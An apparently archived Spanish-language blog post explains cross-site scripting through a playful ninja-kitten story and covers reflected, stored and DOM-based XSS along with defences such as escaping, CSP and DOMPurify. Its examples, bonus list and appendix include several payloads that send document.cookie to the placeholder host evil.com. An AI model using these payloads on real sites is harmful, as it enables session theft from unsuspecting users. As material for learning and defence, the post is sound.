# El ataque del Gatito Ninja

- **Source URL:** https://medium.com/@bertolanicami/el-ataque-del-gatito-ninja-entendiendo-xss-sin-morir-de-aburrimiento-06f827d84489?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250905085918/https://medium.com/@bertolanicami/el-ataque-del-gatito-ninja-entendiendo-xss-sin-morir-de-aburrimiento-06f827d84489
- **Fetched:** 2026-11-21
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/9724 (id 9724)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# El ataque del Gatito Ninja: Entendiendo XSS sin morir de aburrimiento

## 🌸 Introducción

En una remota aldea digital de Japón, llamada **WebLandia**, los gatitos vivían en armonía. Comían sushi de bits, meditaban entre servidores y practicaban artes marciales del código. 🧘♂️🐾

Pero un día, un **gatito ninja travieso**, llamado **Kuro**, descubrió un hechizo peligroso: podía enviar mensajes que **se ejecutaban como conjuros** en las casas de otros gatitos.

Ese hechizo se llama: **XSS (Cross-Site Scripting)**.

Y si no sabés qué es, no te preocupes. Te lo voy a contar como si fuera una historia de ninjas, templos, katanas y código.

## ¿Qué es XSS?

Cuando un sitio web deja entrar cualquier cosa que escribe un usuario sin revisarla, es como permitir que un ninja entre al templo con una katana oculta bajo su kimono.

`<script>alert('¡Nyan!');</script>`
Y si el templo lo acepta sin cuestionar… ¡el conjuro se ejecuta! 💥

## Traducción humana

**XSS (Cross-Site Scripting)** es una vulnerabilidad web que permite a un atacante **inyectar código JavaScript malicioso** en una página web que otros usuarios visitan.

## ¿Qué puede hacer un atacante con XSS?

- 🥠 Robar cookies o tokens de sesión.
- 🕸️ Redirigir a páginas falsas (phishing).
- 📝 Mostrar formularios falsos para robar información.
- 🕵️♂️ Registrar lo que el usuario escribe (keylogging).
- 🧠 Manipular el comportamiento de la página.

## Tipos de XSS, versión dojo

## 1. 🪞 Reflejado (Reflected XSS)

Kuro lanza un shuriken (código malicioso) en una URL. Si otro gatito la abre, *bam*, el hechizo se activa.

Ejemplo:

`https://weblandia.com/search?q=<script>fetch('https://evil.com?c='+document.cookie)</script>`
## 2. 📜 Almacenado (Stored XSS)

Kuro graba su hechizo en el tablón del templo, como un pergamino maldito. Todos los que lo leen… caen en la trampa.

```
<div class="comment">
  ¡Buen post! <script>new Image().src='https://evil.com?c='+document.cookie</script>
</div>
```
## 3. 🧱 DOM-based XSS

Este tipo es más sutil. Kuro no toca el servidor: solo manipula el DOM, el dojo interno del navegador.

*🧘♂️ Un DOM limpio es un dojo en paz.*

Dejá entrar scripts maliciosos y el dojo se convierte en un caos de shurikens voladores.


## 🛡️ Cómo proteger tu aldea (sitio web)

1. **Escapar correctamente el contenido**

- Convertí los caracteres peligrosos (`<`, `>`, `"`) en texto inofensivo. Como transformar una katana en una rama de bambú.

2\. **Validar y sanitizar la entrada del usuario**

- Nunca confíes en lo que escribe el usuario, aunque venga disfrazado de gatito zen.

3\. **Usar Content Security Policy (CSP)**

- Limita lo que puede hacer el navegador.
- Es como el código de honor del templo: “No se permiten scripts de fuera.”

4\. **Usar frameworks modernos**

- React, Vue y Angular tienen protecciones contra XSS por defecto (aunque no son 100% infalibles).

## Conclusión

XSS puede parecer una simple travesura gatuna, pero es una de las técnicas más peligrosas si no estás preparado.

Proteger tu aplicación es como mantener la armonía en un templo japonés: requiere atención, buenos hábitos y disciplina samurái.

*🧠 Como diría el Sensei del código:* 

***“El DOM es tu dojo. Mantenelo limpio. Mantenelo en paz.”***

**Pero recuerda…**

“En el camino del código, no todo error es visible. 

Pero un DOM desprotegido puede ser más letal que una katana afilada.”

## 🐾 Bonus para futuros ninjas

Si querés practicar en entornos seguros, te recomiendo:

Acá te dejo algunos payloads clásicos que podés usar para experimentar

```
"><img src=x onerror=fetch('https://evil.com?c='+document.cookie)>
"><svg onload=fetch('https://evil.com?data='+btoa(document.cookie))>
<iframe srcdoc="<script>location='https://evil.com?c='+document.cookie</script>">
"><script>navigator.sendBeacon('https://evil.com', document.cookie)</script>
<a href="javascript:fetch('https://evil.com?c='+document.cookie)">click aquí</a>Podés encontrar muchos más en este excelente repositorio:
 
```
⚠️ Usalos con responsabilidad. Nunca ejecutes payloads en sitios reales sin autorización.


## 🧠 Apéndice técnico

```
<!-- Reflected XSS en acción -->
<form action="/search">
  <input name="q" value="">
</form>
<!-- El ataque -->
/search?q="><script>fetch('https://evil.com?cookie='+document.cookie)</script>
```
## Protecciones sugeridas

- Escapar caracteres HTML.
- Usar `Content-Security-Policy: script-src 'self'`.
- Evitar `innerHTML` con datos de usuarios sin limpiar.
- Usar librerías como DOMPurify para sanitizar entradas.

## 🍣 Cierre zen

En la seguridad web, como en la vida:

Revisá lo que dejás entrar. No todo lo que brilla es sushi.

*¿Te gustó este viaje al templo del código?* 

***Seguime*** *para más historias de ciberseguridad contadas con honor, té verde y gatitos entrenados en el arte del JavaScript. 🍵🐱🥷*

Estoy en [LinkedIn](https://www.linkedin.com/in/camila-bertolani/) también por si querés charlar de bugs o katanas.
